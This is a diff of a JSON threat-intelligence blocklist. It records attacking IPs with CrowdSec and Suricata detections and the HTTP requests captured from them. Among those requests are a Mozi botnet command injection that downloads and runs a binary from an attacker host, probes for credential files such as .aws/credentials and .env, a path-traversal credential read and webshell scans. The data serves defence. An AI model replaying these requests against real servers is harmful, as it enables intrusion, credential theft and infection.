@@ -1,7 +1,7 @@
 {
   "schema_version": "2",
   "ttl_days": 7,
-  "updated_at": "2026-10-28T01:00:06.650588Z",
+  "updated_at": "2026-10-28T13:00:05.813583Z",
   "items": {
     "37.120.213.13": {
       "ip": "37.120.213.13",
@@ -749,303 +749,6 @@
       },
       "asn": "135377",
       "asn_prefix": "150.107.38.0/24"
-    },
-    "20.169.49.246": {
-      "ip": "20.169.49.246",
-      "family": "v4",
-      "first_seen": "2026-10-21T12:40:03Z",
-      "last_seen": "2026-10-21T12:40:03Z",
-      "scenarios": {
-        "crowdsec/CVE-2022-41082": {
-          "count": 2,
-          "last_seen": "2026-10-21T12:40:03Z"
-        }
-      },
-      "sources": {
-        "crowdsec": {
-          "count": 2,
-          "first_seen": "2026-10-21T12:40:03Z",
-          "last_seen": "2026-10-21T12:40:03Z",
-          "payloads": [
-            "GET /autodiscover/autodiscover.json?@zdi/Powershell"
-          ]
-        }
-      },
-      "asn": "8075",
-      "asn_prefix": "20.160.0.0/12"
-    },
-    "169.58.129.131": {
-      "ip": "169.58.129.131",
-      "family": "v4",
-      "first_seen": "2026-10-21T12:11:05Z",
-      "last_seen": "2026-10-21T12:11:47Z",
-      "scenarios": {
-        "crowdsec/http-technology-probing": {
-          "count": 2,
-          "last_seen": "2026-10-21T12:11:47Z"
-        },
-        "crowdsec/http-admin-interface-probing": {
-          "count": 2,
-          "last_seen": "2026-10-21T12:11:39Z"
-        },
-        "crowdsec/http-probing": {
-          "count": 2,
-          "last_seen": "2026-10-21T12:11:11Z"
-        },
-        "crowdsec/http-sensitive-files": {
-          "count": 2,
-          "last_seen": "2026-10-21T12:11:05Z"
-        }
-      },
-      "sources": {
-        "crowdsec": {
-          "count": 8,
-          "first_seen": "2026-10-21T12:11:05Z",
-          "last_seen": "2026-10-21T12:11:47Z",
-          "payloads": [
-            "GET /info.php",
-            "GET /phpinfo.php",
-            "GET /phpinfo",
-            "GET /_profiler/phpinfo.php",
-            "GET /pms?module=logging&file_name=../../../../../../~/.aws/credentials&number_of_lines=10000",
-            "GET /aws/credentials",
-            "GET /aws/credentials.yml",
-            "GET /backup/.aws/credentials",
-            "GET /s3/.aws/credentials",
-            "GET /api/.aws/credentials",
-            "GET /config/.aws/credentials",
-            "GET /~/.aws/credentials",
-            "GET /.git/config",
-            "GET /.env",
-            "GET /config/.env"
-          ]
-        }
-      },
-      "asn": "51167",
-      "asn_prefix": "169.58.128.0/17"
-    },
-    "20.194.17.163": {
-      "ip": "20.194.17.163",
-      "family": "v4",
-      "first_seen": "2026-10-21T08:32:46Z",
-      "last_seen": "2026-10-21T08:33:13Z",
-      "scenarios": {
-        "crowdsec/http-admin-interface-probing": {
-          "count": 1,
-          "last_seen": "2026-10-21T08:33:13Z"
-        },
-        "crowdsec/http-wordpress-scan": {
-          "count": 1,
-          "last_seen": "2026-10-21T08:32:47Z"
-        },
-        "crowdsec/http-probing": {
-          "count": 1,
-          "last_seen": "2026-10-21T08:32:46Z"
-        }
-      },
-      "sources": {
-        "crowdsec": {
-          "count": 3,
-          "first_seen": "2026-10-21T08:32:46Z",
-          "last_seen": "2026-10-21T08:33:13Z",
-          "payloads": [
-            "GET /admin.php",
-            "GET /adminfuns.php",
-            "GET /admin.php?",
-            "GET /wp-content/plugins/hellopress/wp_filemanager.php",
-            "GET /wp-gans.php",
-            "GET /wp-cs.php",
-            "GET /wp-admin/css/about.php",
-            "GET /this_is_a_new_hello_world.php",
-            "GET /md5.php3",
-            "GET /cupid.php",
-            "GET /whisk.php",
-            "GET /assets-2f.php",
-            "GET /bad.php",
-            "GET /te.php",
-            "GET /csss.php?p="
-          ]
-        }
-      },
-      "asn": "8075",
-      "asn_prefix": "20.192.0.0/10"
-    },
-    "45.147.208.29": {
-      "ip": "45.147.208.29",
-      "family": "v4",
-      "first_seen": "2026-10-21T08:20:50Z",
-      "last_seen": "2026-10-21T08:26:00Z",
-      "scenarios": {
-        "crowdsec/http-probing": {
-          "count": 2,
-          "last_seen": "2026-10-21T08:26:00Z"
-        },
-        "crowdsec/http-crawl-non_statics": {
-          "count": 1,
-          "last_seen": "2026-10-21T08:20:50Z"
-        }
-      },
-      "sources": {
-        "crowdsec": {
-          "count": 3,
-          "first_seen": "2026-10-21T08:20:50Z",
-          "last_seen": "2026-10-21T08:26:00Z",
-          "payloads": [
-            "GET /rest/feed/favicon/16692?t=1792571160493",
-            "GET /rest/feed/favicon/16686?t=1792571160500",
-            "GET /rest/feed/favicon/16423?t=1792571160500",
-            "GET /rest/feed/favicon/6006",
-            "GET /rest/feed/favicon/1028",
-            "GET /rest/feed/favicon/16661",
-            "GET /rest/feed/favicon/16673",
-            "GET /rest/feed/favicon/8012",
-            "GET /rest/feed/favicon/1034",
-            "GET /rest/feed/favicon/16342",
-            "GET /rest/feed/favicon/1033",
-            "GET /rest/feed/favicon/16694",
-            "GET /rest/feed/favicon/16710",
-            "GET /rest/feed/favicon/12019",
-            "GET /rest/feed/favicon/2039",
-            "GET /rest/feed/favicon/16583",
-            "GET /rest/feed/favicon/16586",
-            "GET /rest/feed/favicon/16584",
-            "GET /rest/feed/favicon/1050",
-            "GET /rest/feed/favicon/2003"
-          ]
-        }
-      },
-      "asn": "47160",
-      "asn_prefix": "45.147.208.0/22"
-    },
-    "35.245.112.180": {
-      "ip": "35.245.112.180",
-      "family": "v4",
-      "first_seen": "2026-10-21T05:57:51Z",
-      "last_seen": "2026-10-21T06:06:55Z",
-      "scenarios": {
-        "crowdsec/http-path-traversal-probing": {
-          "count": 2,
-          "last_seen": "2026-10-21T06:06:55Z"
-        },
-        "crowdsec/http-bad-user-agent": {
-          "count": 2,
-          "last_seen": "2026-10-21T06:06:54Z"
-        },
-        "crowdsec/http-crawl-non_statics": {
-          "count": 2,
-          "last_seen": "2026-10-21T06:06:53Z"
-        },
-        "crowdsec/http-probing": {
-          "count": 2,
-          "last_seen": "2026-10-21T06:06:52Z"
-        },
-        "crowdsec/http-dos-swithcing-ua": {
-          "count": 2,
-          "last_seen": "2026-10-21T06:06:52Z"
-        },
-        "crowdsec/http-sensitive-files": {
-          "count": 2,
-          "last_seen": "2026-10-21T06:06:52Z"
-        }
-      },
-      "sources": {
-        "crowdsec": {
-          "count": 12,
-          "first_seen": "2026-10-21T05:57:51Z",
-          "last_seen": "2026-10-21T06:06:55Z",
-          "payloads": [
-            "GET /.config/gcloud/application_default_credentials.json",
-            "GET /.env.keys",
-            "GET /.ssh/config",
-            "GET /service_account.json",
-            "GET /railway.json",
-            "GET /secrets.env",
-            "GET /secrets.json",
-            "GET /secrets.yml",
-            "GET /.git/HEAD",
-            "GET /.htpasswd",
-            "GET /",
-            "GET /robots.txt",
-            "GET /1ind1petzuf2dm4razaq",
-            "GET /98tjp6sghcg158n1nl1o",
-            "GET /z9x8c7v6b5-debug-trigger-salledarcade.fr",
-            "GET /firebase-service-account.json",
-            "POST /_next",
-            "GET /.git-credentials",
-            "GET /credentials.json",
-            "GET /serviceAccountKey.json"
-          ]
-        }
-      },
-      "asn": "396982",
-      "asn_prefix": "35.245.112.0/20"
-    },
-    "216.180.246.229": {
-      "ip": "216.180.246.229",
-      "family": "v4",
-      "first_seen": "2026-10-21T05:34:19Z",
-      "last_seen": "2026-10-21T05:34:19Z",
-      "scenarios": {
-        "crowdsec/http-probing": {
-          "count": 1,
-          "last_seen": "2026-10-21T05:34:19Z"
-        },
-        "crowdsec/http-admin-interface-probing": {
-          "count": 1,
-          "last_seen": "2026-10-21T05:34:19Z"
-        },
-        "crowdsec/http-technology-probing": {
-          "count": 1,
-          "last_seen": "2026-10-21T05:34:19Z"
-        }
-      },
-      "sources": {
-        "crowdsec": {
-          "count": 3,
-          "first_seen": "2026-10-21T05:34:19Z",
-          "last_seen": "2026-10-21T05:34:19Z",
-          "payloads": [
-            "GET /manage/account/login",
-            "GET /admin/index.html",
-            "GET /index.html",
-            "GET /+CSCOE+/logon.html",
-            "GET /cgi-bin/login.cgi",
-            "GET /login.htm",
-            "GET /login.html",
-            "GET /login.jsp",
-            "GET /login",
-            "GET /doc/index.html",
-            "GET /remote/login"
-          ]
-        }
-      },
-      "asn": "396982",
-      "asn_prefix": "216.180.246.0/24"
-    },
-    "66.132.195.53": {
-      "ip": "66.132.195.53",
-      "family": "v4",
-      "first_seen": "2026-10-21T02:34:36Z",
-      "last_seen": "2026-10-21T02:34:36Z",
-      "scenarios": {
-        "crowdsec/http-bad-user-agent": {
-          "count": 1,
-          "last_seen": "2026-10-21T02:34:36Z"
-        }
-      },
-      "sources": {
-        "crowdsec": {
-          "count": 1,
-          "first_seen": "2026-10-21T02:34:36Z",
-          "last_seen": "2026-10-21T02:34:36Z",
-          "payloads": [
-            "GET /",
-            "GET /debug/pprof/"
-          ]
-        }
-      },
-      "asn": "398324",
-      "asn_prefix": "66.132.195.0/24"
     },
     "153.117.37.60": {
       "ip": "153.117.37.60",
@@ -36241,6 +35944,175 @@
       },
       "asn": "29222",
       "asn_prefix": "91.214.188.0/22"
+    },
+    "66.132.186.168": {
+      "ip": "66.132.186.168",
+      "family": "v4",
+      "first_seen": "2026-10-28T09:01:20Z",
+      "last_seen": "2026-10-28T09:01:20Z",
+      "scenarios": {
+        "crowdsec/http-bad-user-agent": {
+          "count": 1,
+          "last_seen": "2026-10-28T09:01:20Z"
+        }
+      },
+      "sources": {
+        "crowdsec": {
+          "count": 1,
+          "first_seen": "2026-10-28T09:01:20Z",
+          "last_seen": "2026-10-28T09:01:20Z",
+          "payloads": [
+            "GET /",
+            "GET /debug/pprof/"
+          ]
+        }
+      },
+      "asn": "398324",
+      "asn_prefix": "66.132.186.0/24"
+    },
+    "216.180.246.248": {
+      "ip": "216.180.246.248",
+      "family": "v4",
+      "first_seen": "2026-10-28T05:23:10Z",
+      "last_seen": "2026-10-28T05:23:10Z",
+      "scenarios": {
+        "crowdsec/http-admin-interface-probing": {
+          "count": 1,
+          "last_seen": "2026-10-28T05:23:10Z"
+        },
+        "crowdsec/http-technology-probing": {
+          "count": 1,
+          "last_seen": "2026-10-28T05:23:10Z"
+        },
+        "crowdsec/http-probing": {
+          "count": 1,
+          "last_seen": "2026-10-28T05:23:10Z"
+        }
+      },
+      "sources": {
+        "crowdsec": {
+          "count": 3,
+          "first_seen": "2026-10-28T05:23:10Z",
+          "last_seen": "2026-10-28T05:23:10Z",
+          "payloads": [
+            "GET /admin/index.html",
+            "GET /+CSCOE+/logon.html",
+            "GET /remote/login",
+            "GET /",
+            "GET /manage/account/login",
+            "GET /index.html",
+            "GET /cgi-bin/login.cgi",
+            "GET /login.htm",
+            "GET /login.html",
+            "GET /login.jsp",
+            "GET /login",
+            "GET /doc/index.html"
+          ]
+        }
+      },
+      "asn": "396982",
+      "asn_prefix": "216.180.246.0/24"
+    },
+    "184.105.139.68": {
+      "ip": "184.105.139.68",
+      "family": "v4",
+      "first_seen": "2026-10-28T03:46:46Z",
+      "last_seen": "2026-10-28T03:46:46Z",
+      "scenarios": {
+        "crowdsec/http-technology-probing": {
+          "count": 1,
+          "last_seen": "2026-10-28T03:46:46Z"
+        }
+      },
+      "sources": {
+        "crowdsec": {
+          "count": 1,
+          "first_seen": "2026-10-28T03:46:46Z",
+          "last_seen": "2026-10-28T03:46:46Z",
+          "payloads": [
+            "GET /remote/logincheck"
+          ]
+        }
+      },
+      "asn": "6939",
+      "asn_prefix": "184.104.0.0/15"
+    },
+    "153.117.9.89": {
+      "ip": "153.117.9.89",
+      "family": "v4",
+      "first_seen": "2026-10-28T06:00:46Z",
+      "last_seen": "2026-10-28T06:00:46Z",
+      "scenarios": {
+        "suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound)": {
+          "count": 1,
+          "last_seen": "2026-10-28T06:00:46Z"
+        }
+      },
+      "sources": {
+        "suricata": {
+          "count": 1,
+          "first_seen": "2026-10-28T06:00:46Z",
+          "last_seen": "2026-10-28T06:00:46Z",
+          "sids": [
+            2009363
+          ],
+          "max_priority": 1,
+          "payloads": [
+            "GET /shell?cd+/tmp;rm+-rf+*;wget+http://153.117.9.89:33418/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws"
+          ]
+        }
+      },
+      "asn": "9541",
+      "asn_prefix": "153.117.9.0/24"
+    },
+    "43.135.25.158": {
+      "ip": "43.135.25.158",
+      "family": "v4",
+      "first_seen": "2026-10-28T02:09:33Z",
+      "last_seen": "2026-10-28T02:09:33Z",
+      "scenarios": {
+        "suricata/ET WEB_SERVER WebShell Generic - wget http - POST": {
+          "count": 1,
+          "last_seen": "2026-10-28T02:09:33Z"
+        }
+      },
+      "sources": {
+        "suricata": {
+          "count": 1,
+          "first_seen": "2026-10-28T02:09:33Z",
+          "last_seen": "2026-10-28T02:09:33Z",
+          "sids": [
+            2016683
+          ],
+          "max_priority": 2,
+          "payloads": [
+            "POST /applyapp.cgi"
+          ]
+        }
+      }
+    },
+    "45.156.87.50": {
+      "ip": "45.156.87.50",
+      "family": "v4",
+      "first_seen": "2026-10-28T06:02:56Z",
+      "last_seen": "2026-10-28T06:02:56Z",
+      "scenarios": {
+        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 15": {
+          "count": 1,
+          "last_seen": "2026-10-28T06:02:56Z"
+        }
+      },
+      "sources": {
+        "suricata": {
+          "count": 1,
+          "first_seen": "2026-10-28T06:02:56Z",
+          "last_seen": "2026-10-28T06:02:56Z",
+          "sids": [
+            2500028
+          ],
+          "max_priority": 2
+        }
+      }
     }
   },
   "asn_names": {
@@ -36269,7 +36141,6 @@
     "24492": "IIT-WICAM-AS-AP - WiCAM Corporation Ltd.",
     "23273": "HOSTP-LA - HostPapa",
     "29571": "Orange C\u00f4te d'Ivoire - Orange C\u00f4te d'Ivoire",
-    "47160": "MOJI MOJI SAS",
     "51167": "CONTABO Contabo GmbH",
     "10439": "CARINET - CariNet, Inc.",
     "1133": "UTWENTE-AS SURF B.V.",
@@ -36582,6 +36453,8 @@
     "210328": "ALMAZ AO ALMAZ",
     "50053": "VDSKA-AS Anton Levin",
     "5650": "FRONTIER-FRTR - Frontier Communications of America, Inc.",
-    "60982": "XZONE X-ZONE IT SRL"
+    "60982": "XZONE X-ZONE IT SRL",
+    "29222": "Infomaniak-AS Infomaniak Network SA",
+    "38264": "WATEEN-IMS-PK-AS-AP - National WiMAX/IMS environment"
   }
 }
